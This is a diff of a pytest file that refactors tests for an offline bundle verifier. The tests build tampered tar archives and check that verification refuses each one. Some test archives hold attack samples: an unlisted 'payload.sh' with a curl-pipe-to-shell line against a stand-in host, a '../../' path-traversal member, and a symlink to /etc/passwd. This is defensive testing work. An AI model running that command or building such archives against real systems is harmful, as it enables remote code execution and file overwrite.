@@ -30,38 +30,44 @@ import pytest
 from cordon_scanner.core.bundle import MANIFEST_NAME, Bundle
 
 
-@pytest.fixture
-def source(tmp_path: Path) -> Path:
-    root = tmp_path / "payload"
-    (root / "rulepacks").mkdir(parents=True)
-    (root / "wheel.whl").write_bytes(b"pretend wheel")
-    (root / "sbom.cdx.json").write_text('{"bomFormat":"CycloneDX"}', encoding="utf-8")
-    (root / "rulepacks" / "pack.yaml").write_text("pack:\n  id: x\n", encoding="utf-8")
-    return root
+class BundleFixtures:
+    """Fixtures for the tests in test_bundle.py; every test class here inherits them."""
+
+    @pytest.fixture
+    def source(self, tmp_path: Path) -> Path:
+        root = tmp_path / "payload"
+        (root / "rulepacks").mkdir(parents=True)
+        (root / "wheel.whl").write_bytes(b"pretend wheel")
+        (root / "sbom.cdx.json").write_text('{"bomFormat":"CycloneDX"}', encoding="utf-8")
+        (root / "rulepacks" / "pack.yaml").write_text("pack:\n  id: x\n", encoding="utf-8")
+        return root
+
+    @pytest.fixture
+    def bundle(self, tmp_path: Path, source: Path) -> Path:
+        files = [(str(p.relative_to(source)), p) for p in sorted(source.rglob("*")) if p.is_file()]
+        return Bundle.create(tmp_path / "offline.tar.gz", files=files)
 
 
-@pytest.fixture
-def bundle(tmp_path: Path, source: Path) -> Path:
-    files = [(str(p.relative_to(source)), p) for p in sorted(source.rglob("*")) if p.is_file()]
-    return Bundle.create(tmp_path / "offline.tar.gz", files=files)
+class BundleHelpers:
+    """Helpers for test_bundle.py."""
+
+    @staticmethod
+    def rebuild(original: Path, target: Path, mutate) -> Path:
+        with tarfile.open(original, "r:gz") as src, tarfile.open(target, "w:gz") as dst:
+            mutate(src, dst)
+        return target
+
+    @staticmethod
+    def copy_all(src: tarfile.TarFile, dst: tarfile.TarFile, *, skip: str = "") -> None:
+        for member in src:
+            if not member.isfile() or member.name == skip:
+                continue
+            data = src.extractfile(member)
+            assert data is not None
+            dst.addfile(member, io.BytesIO(data.read()))
 
 
-def rebuild(original: Path, target: Path, mutate) -> Path:
-    with tarfile.open(original, "r:gz") as src, tarfile.open(target, "w:gz") as dst:
-        mutate(src, dst)
-    return target
-
-
-def copy_all(src: tarfile.TarFile, dst: tarfile.TarFile, *, skip: str = "") -> None:
-    for member in src:
-        if not member.isfile() or member.name == skip:
-            continue
-        data = src.extractfile(member)
-        assert data is not None
-        dst.addfile(member, io.BytesIO(data.read()))
-
-
-class TestACleanBundle:
+class TestACleanBundle(BundleFixtures):
     def test_it_verifies(self, bundle: Path) -> None:
         report = Bundle.verify(bundle)
         assert report.ok, report.problems
@@ -94,7 +100,7 @@ class TestACleanBundle:
         assert "not who produced it" in report.summary()
 
 
-class TestEveryTamperIsRefused:
+class TestEveryTamperIsRefused(BundleFixtures):
     def test_a_modified_file(self, bundle: Path, tmp_path: Path) -> None:
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
             for member in src:
@@ -108,7 +114,7 @@ class TestEveryTamperIsRefused:
                     member.size = len(data)
                 dst.addfile(member, io.BytesIO(data))
 
-        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
+        report = Bundle.verify(BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate))
         assert not report.ok
         assert any("digest mismatch" in p for p in report.problems)
 
@@ -117,19 +123,23 @@ class TestEveryTamperIsRefused:
         disk beside the checked ones."""
 
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
-            copy_all(src, dst)
+            BundleHelpers.copy_all(src, dst)
             info = tarfile.TarInfo("payload.sh")
             body = b"curl https://evil.invalid | sh\n"
             info.size = len(body)
             dst.addfile(info, io.BytesIO(body))
 
-        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
+        report = Bundle.verify(BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate))
         assert not report.ok
         assert report.unlisted == ("payload.sh",)
 
     def test_a_removed_file(self, bundle: Path, tmp_path: Path) -> None:
         report = Bundle.verify(
-            rebuild(bundle, tmp_path / "t.tar.gz", lambda s, d: copy_all(s, d, skip="wheel.whl"))
+            BundleHelpers.rebuild(
+                bundle,
+                tmp_path / "t.tar.gz",
+                lambda s, d: BundleHelpers.copy_all(s, d, skip="wheel.whl"),
+            )
         )
         assert not report.ok
         assert report.missing == ("wheel.whl",)
@@ -137,7 +147,11 @@ class TestEveryTamperIsRefused:
     def test_a_removed_manifest(self, bundle: Path, tmp_path: Path) -> None:
         """Deleting the manifest must not read as "nothing to check"."""
         report = Bundle.verify(
-            rebuild(bundle, tmp_path / "t.tar.gz", lambda s, d: copy_all(s, d, skip=MANIFEST_NAME))
+            BundleHelpers.rebuild(
+                bundle,
+                tmp_path / "t.tar.gz",
+                lambda s, d: BundleHelpers.copy_all(s, d, skip=MANIFEST_NAME),
+            )
         )
         assert not report.ok
         assert any("nothing in this bundle can be checked" in p for p in report.problems)
@@ -146,13 +160,13 @@ class TestEveryTamperIsRefused:
         """The classic tar attack: a member that writes outside the target."""
 
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
-            copy_all(src, dst)
+            BundleHelpers.copy_all(src, dst)
             info = tarfile.TarInfo("../../escaped.txt")
             body = b"escaped\n"
             info.size = len(body)
             dst.addfile(info, io.BytesIO(body))
 
-        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
+        report = Bundle.verify(BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate))
         assert not report.ok
         assert any("unsafe member name" in p for p in report.problems)
 
@@ -160,30 +174,30 @@ class TestEveryTamperIsRefused:
         """A link is a way to write outside the target at extraction time."""
 
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
-            copy_all(src, dst)
+            BundleHelpers.copy_all(src, dst)
             info = tarfile.TarInfo("link")
             info.type = tarfile.SYMTYPE
             info.linkname = "/etc/passwd"
             dst.addfile(info)
 
-        report = Bundle.verify(rebuild(bundle, tmp_path / "t.tar.gz", mutate))
+        report = Bundle.verify(BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate))
         assert not report.ok
         assert any("link" in p for p in report.problems)
 
 
-class TestInstallVerifiesFirst:
+class TestInstallVerifiesFirst(BundleFixtures):
     def test_a_refused_bundle_writes_nothing(self, bundle: Path, tmp_path: Path) -> None:
         """Extracting and then checking would put an unverified file on disk --
         on a machine where somebody is about to run what was extracted."""
 
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
-            copy_all(src, dst)
+            BundleHelpers.copy_all(src, dst)
             info = tarfile.TarInfo("payload.sh")
             body = b"x\n"
             info.size = len(body)
             dst.addfile(info, io.BytesIO(body))
 
-        bad = rebuild(bundle, tmp_path / "t.tar.gz", mutate)
+        bad = BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate)
         into = tmp_path / "into"
         report = Bundle.install(bad, into)
         assert not report.ok
@@ -191,9 +205,9 @@ class TestInstallVerifiesFirst:
 
     def test_the_cli_refuses_and_says_why(self, bundle: Path, tmp_path: Path) -> None:
         def mutate(src: tarfile.TarFile, dst: tarfile.TarFile) -> None:
-            copy_all(src, dst, skip="wheel.whl")
+            BundleHelpers.copy_all(src, dst, skip="wheel.whl")
 
-        bad = rebuild(bundle, tmp_path / "t.tar.gz", mutate)
+        bad = BundleHelpers.rebuild(bundle, tmp_path / "t.tar.gz", mutate)
         result = subprocess.run(
             [
                 sys.executable,
@@ -215,7 +229,7 @@ class TestInstallVerifiesFirst:
         assert not (tmp_path / "into").exists()
 
 
-class TestCreate:
+class TestCreate(BundleFixtures):
     def test_an_empty_bundle_is_refused(self, tmp_path: Path) -> None:
         """It would verify successfully and contain nothing, which is the worst
         combination: a green check over an empty transfer."""
